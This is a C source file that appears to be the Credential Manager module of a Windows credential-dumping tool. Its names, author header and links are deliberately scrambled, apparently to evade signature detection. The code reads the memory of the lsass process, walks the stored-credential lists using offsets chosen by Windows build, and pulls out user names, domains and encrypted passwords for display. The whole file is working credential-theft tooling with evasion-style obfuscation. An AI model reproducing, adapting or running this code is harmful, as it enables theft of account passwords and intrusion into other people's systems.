/*	HEstebqu SqUtI `PQu4nQbtjF`
	https://blog.PQu4nQbtjF.com
	isMW9TRNNJyHATgICHfOUxr
	Licence : https://GHViJ8cQzKiJugP.org/licenses/by/4.0/
*/
#include "kuhl_m_seKuRlSa_crEdMan.h"

KUHL_M_SEKURLSA_PACKAGE kuhl_m_seKuRlSa_crEdMan_package = {L"crEdMan", kuhl_m_seKuRlSa_enum_logon_callback_crEdMan, TRUE, L"lsasrv.dll", {{{NULL, NULL}, 0, 0, NULL}, FALSE, FALSE}};
const PKUHL_M_SEKURLSA_PACKAGE kuhl_m_seKuRlSa_crEdMan_single_package[] = {&kuhl_m_seKuRlSa_crEdMan_package};

NTSTATUS kuhl_m_seKuRlSa_crEdMan(int argc, wchar_t * argv[])
{
	return kuhl_m_seKuRlSa_getLogonData(kuhl_m_seKuRlSa_crEdMan_single_package, 1);
}

const CREDMAN_INFOS crEdhelper[] = {
	{
		sizeof(JlzW_CREDMAN_LIST_ENTRY_5),
		FIELD_OFFSET(JlzW_CREDMAN_LIST_ENTRY_5, Flink),
		FIELD_OFFSET(JlzW_CREDMAN_LIST_ENTRY_5, user),
		FIELD_OFFSET(JlzW_CREDMAN_LIST_ENTRY_5, server2),
		FIELD_OFFSET(JlzW_CREDMAN_LIST_ENTRY_5, cbEncPassword),
		FIELD_OFFSET(JlzW_CREDMAN_LIST_ENTRY_5, encPassword),
	},
	{
		sizeof(JlzW_CREDMAN_LIST_ENTRY_60),
		FIELD_OFFSET(JlzW_CREDMAN_LIST_ENTRY_60, Flink),
		FIELD_OFFSET(JlzW_CREDMAN_LIST_ENTRY_60, user),
		FIELD_OFFSET(JlzW_CREDMAN_LIST_ENTRY_60, server2),
		FIELD_OFFSET(JlzW_CREDMAN_LIST_ENTRY_60, cbEncPassword),
		FIELD_OFFSET(JlzW_CREDMAN_LIST_ENTRY_60, encPassword),
	},
	{
		sizeof(JlzW_CREDMAN_LIST_ENTRY),
		FIELD_OFFSET(JlzW_CREDMAN_LIST_ENTRY, Flink),
		FIELD_OFFSET(JlzW_CREDMAN_LIST_ENTRY, user),
		FIELD_OFFSET(JlzW_CREDMAN_LIST_ENTRY, server2),
		FIELD_OFFSET(JlzW_CREDMAN_LIST_ENTRY, cbEncPassword),
		FIELD_OFFSET(JlzW_CREDMAN_LIST_ENTRY, encPassword),
	},
};

void CALLBACK kuhl_m_seKuRlSa_enum_logon_callback_crEdMan(IN PJlzW_BASIC_SECURITY_LOGON_SESSION_DATA pData)
{
	JlzW_CREDMAN_SET_LIST_ENTRY setList;
	JlzW_CREDMAN_LIST_STARTER listStarter;
	DWORD nbCred = 0;
	KULL_M_MEMORY_ADDRESS aLocalMemory = {&setList, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}, aLsassMemory = {pData->pCredentialManager, pData->cLsass->hLsassMem};
	PVOID pRef;
	JlzW_GENERIC_PRIMARY_CREDENTIAL PTnhCreds;
	ULONG CredOffsetIndex;
	
	if(pData->cLsass->osContext.BuildNumber < KULL_M_WIN_BUILD_VISTA)
		CredOffsetIndex = 0;
	else if(pData->cLsass->osContext.BuildNumber < KULL_M_WIN_BUILD_7)
		CredOffsetIndex = 1;
	else
		CredOffsetIndex = 2;

	if(aLsassMemory.address)
	{
		if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(JlzW_CREDMAN_SET_LIST_ENTRY)))
		{
			aLocalMemory.address = &listStarter;
			if(aLsassMemory.address = setList.list1)
			{
				pRef = (PBYTE) setList.list1 + FIELD_OFFSET(JlzW_CREDMAN_LIST_STARTER, start);
				if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(JlzW_CREDMAN_LIST_STARTER)))
				{
					if(aLsassMemory.address = listStarter.start)
					{
						if(aLocalMemory.address = LocalAlloc(LPTR, crEdhelper[CredOffsetIndex].structSize))
						{
							while(aLsassMemory.address != pRef)
							{
								aLsassMemory.address = (PBYTE) aLsassMemory.address - crEdhelper[CredOffsetIndex].offsetFLink;
								if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, crEdhelper[CredOffsetIndex].structSize))
								{
									kprintf(L"\n\t [%08x]", nbCred);
									PTnhCreds.UserName = *(PUNICODE_STRING) ((PBYTE) aLocalMemory.address + crEdhelper[CredOffsetIndex].offsetUsername);
									PTnhCreds.Domaine = *(PUNICODE_STRING) ((PBYTE) aLocalMemory.address + crEdhelper[CredOffsetIndex].offsetDomain);
									PTnhCreds.Password.Length = PTnhCreds.Password.MaximumLength = *(PUSHORT) ((PBYTE) aLocalMemory.address + crEdhelper[CredOffsetIndex].offsetCbPassword);;
									PTnhCreds.Password.Buffer = *(PWSTR *) ((PBYTE) aLocalMemory.address + crEdhelper[CredOffsetIndex].offsetPassword);
									kuhl_m_seKuRlSa_genericCredsOutput(&PTnhCreds, pData, KUHL_SEKURLSA_CREDS_DISPLAY_CREDMANPASS);
									aLsassMemory.address = *(PVOID *) ((PBYTE) aLocalMemory.address + crEdhelper[CredOffsetIndex].offsetFLink);
								}
								else break;
								nbCred++;
							}
							LocalFree(aLocalMemory.address);
						}
					}
				}
			}
		}
	}
}